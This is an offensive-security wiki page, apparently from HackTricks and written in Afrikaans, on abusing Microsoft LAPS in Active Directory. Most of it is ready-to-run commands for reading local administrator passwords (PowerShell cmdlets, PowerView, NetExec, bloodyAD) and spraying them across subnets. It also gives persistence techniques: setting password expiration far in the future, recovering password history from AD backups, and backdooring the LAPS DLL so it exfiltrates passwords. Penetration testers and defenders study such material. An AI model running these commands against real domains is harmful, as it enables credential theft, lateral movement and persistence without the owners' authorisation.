# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basiese Inligting

Daar is tans **2 LAPS-smake** wat jy tydens ’n assessering kan teëkom:

- **Legacy Microsoft LAPS**: stoor die plaaslike administrateurwagwoord in **`ms-Mcs-AdmPwd`** en die vervaltyd in **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (ingebou in Windows sedert die April 2023-opdaterings): kan steeds legacy-modus emuleer, maar in native modus gebruik dit **`msLAPS-*`**-attribuut, ondersteun **password encryption**, **password history**, en **DSRM password backup** vir domain controllers.

LAPS is ontwerp om **plaaslike administrateurwagwoorde** te bestuur, en maak hulle **uniek, gerandomiseer en gereeld verander** op domain-joined rekenaars. As jy daardie attribuut kan lees, kan jy gewoonlik **pivot as die local admin** na die betrokke host. In baie omgewings is die interessante deel nie net om die wagwoord self te lees nie, maar ook om te vind **aan wie toegang gedelegeer is** tot die wagwoord-attribuut.

### Legacy Microsoft LAPS attributes

In die domain se computer objects lei die implementering van legacy Microsoft LAPS tot die byvoeging van twee attribuut:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS voeg verskeie nuwe attribuut by computer objects:

- **`msLAPS-Password`**: clear-text password blob gestoor as JSON wanneer encryption nie geaktiveer is nie
- **`msLAPS-PasswordExpirationTime`**: geskeduleerde vervaltyd
- **`msLAPS-EncryptedPassword`**: geënkripteerde huidige wagwoord
- **`msLAPS-EncryptedPasswordHistory`**: geënkripteerde wagwoordgeskiedenis
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: geënkripteerde DSRM-wagwoorddata vir domain controllers
- **`msLAPS-CurrentPasswordVersion`**: GUID-gebaseerde weergawe-opsporing wat deur nuwer rollback-detection logic gebruik word (Windows Server 2025 forest schema)

Wanneer **`msLAPS-Password`** leesbaar is, is die waarde ’n JSON object wat die account name, update time en clear-text password bevat, byvoorbeeld:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Kontroleer of geaktiveer is
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

Jy kan die **raw LAPS policy** aflaai van `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` en dan **`Parse-PolFile`** van die [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package gebruik om hierdie file na 'n mensleesbare formaat om te skakel.

### Legacy Microsoft LAPS PowerShell cmdlets

As die legacy LAPS module geïnstalleer is, is die volgende cmdlets gewoonlik beskikbaar:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS kom met 'n nuwe PowerShell module en nuwe cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
’n Paar operasionele besonderhede is hier belangrik:

- **`Get-LapsADPassword`** hanteer outomaties **legacy LAPS**, **clear-text Windows LAPS**, en **encrypted Windows LAPS**.
- As die password encrypted is en jy kan dit **read** maar nie **decrypt** nie, gee die cmdlet metadata terug maar nie die clear-text password nie.
- **Password history** is slegs beskikbaar wanneer **Windows LAPS encryption** geaktiveer is.
- Op domain controllers kan die teruggekeerde source **`EncryptedDSRMPassword`** wees.

### PowerView / LDAP

**PowerView** kan ook gebruik word om uit te vind **wie die password kan read en dit read**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
As **`msLAPS-Password`** leesbaar is, ontleed die teruggekeerde JSON en onttrek **`p`** vir die wagwoord en **`n`** vir die bestuurde plaaslike admin-rekeningnaam.

### Linux / remote tooling

Moderne tooling ondersteun beide legacy Microsoft LAPS en Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notas:

- Onlangse **NetExec** builds ondersteun **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, en **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** is steeds nuttig vir **legacy Microsoft LAPS** vanaf Linux, maar dit teiken slegs **`ms-Mcs-AdmPwd`**.
- As die omgewing **encrypted Windows LAPS** gebruik, is ’n eenvoudige LDAP read nie genoeg nie; jy moet ook ’n **authorized decryptor** wees of ’n ondersteunde decrypt path misbruik.

### Directory synchronization abuse

As jy domain-vlak **directory synchronization** rights het in plaas van direkte read access op elke computer object, kan LAPS steeds interessant wees.

Die kombinasie van **`DS-Replication-Get-Changes`** met **`DS-Replication-Get-Changes-In-Filtered-Set`** of **`DS-Replication-Get-Changes-All`** kan gebruik word om **confidential / RODC-filtered** attributes soos legacy **`ms-Mcs-AdmPwd`** te synchronize. BloodHound modelleer dit as **`SyncLAPSPassword`**. Kyk [DCSync](dcsync.md) vir die replicatierights-agtergrond.

## LAPSToolkit

Die [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) vergemaklik die enumeration van LAPS met verskeie functions.\
Een daarvan is die parsing van **`ExtendedRights`** vir **all computers with LAPS enabled.** Dit wys **groups** wat spesifiek **gedelegeer is om LAPS passwords te lees**, wat dikwels users in protected groups is.\
’n **account** wat ’n computer by ’n domain **joined** het, ontvang `All Extended Rights` oor daardie host, en hierdie right gee die **account** die vermoë om **passwords te lees**. Enumeration kan ’n user account toon wat die LAPS password op ’n host kan lees. Dit kan ons help om **spesifieke AD users te target** wat LAPS passwords kan lees.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping LAPS Passwords With NetExec / CrackMapExec

As jy nie ’n interaktiewe PowerShell het nie, kan jy hierdie voorreg op afstand oor LDAP misbruik:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Dit dump al die LAPS secrets wat die gebruiker kan lees, en laat jou toe om lateraal te beweeg met ’n ander plaaslike administrateurwagwoord.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Vervaldatum

Sodra admin, is dit moontlik om die **wachtwoorde te bekom** en te **verhoed** dat 'n masjien sy **wachtwoord** **opdateer** deur die **vervaldatum in die toekoms te stel**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS gebruik eerder **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Die wagwoord sal steeds roteer as ’n **admin** **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** gebruik, of as **Do not allow password expiration time longer than required by policy** geaktiveer is.

### Herwinning van historiese wagwoorde uit AD-rugsteun

Wanneer **Windows LAPS encryption + password history** geaktiveer is, kan gemonteerde AD-rugsteun ’n bykomende bron van secrets word. As jy toegang tot ’n gemonteerde AD snapshot kan kry en **recovery mode** kan gebruik, kan jy ouer gestoorde wagwoorde navraag doen sonder om met ’n lewendige DC te praat.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Dit is meestal relevant tydens **AD backup theft**, **offline forensics abuse**, of **disaster-recovery media access**.

### Backdoor

Die oorspronklike bronkode vir legacy Microsoft LAPS kan [hier](https://github.com/GreyCorbel/admpwd) gevind word, daarom is dit moontlik om ’n backdoor in die kode te plaas (byvoorbeeld binne die `Get-AdmPwdPassword` metode in `Main/AdmPwd.PS/Main.cs`) wat op een of ander manier **nuwe passwords sal exfiltrate of hulle êrens sal stoor**.

Compileer dan die nuwe `AdmPwd.PS.dll` en upload dit na die masjien in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (en verander die modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
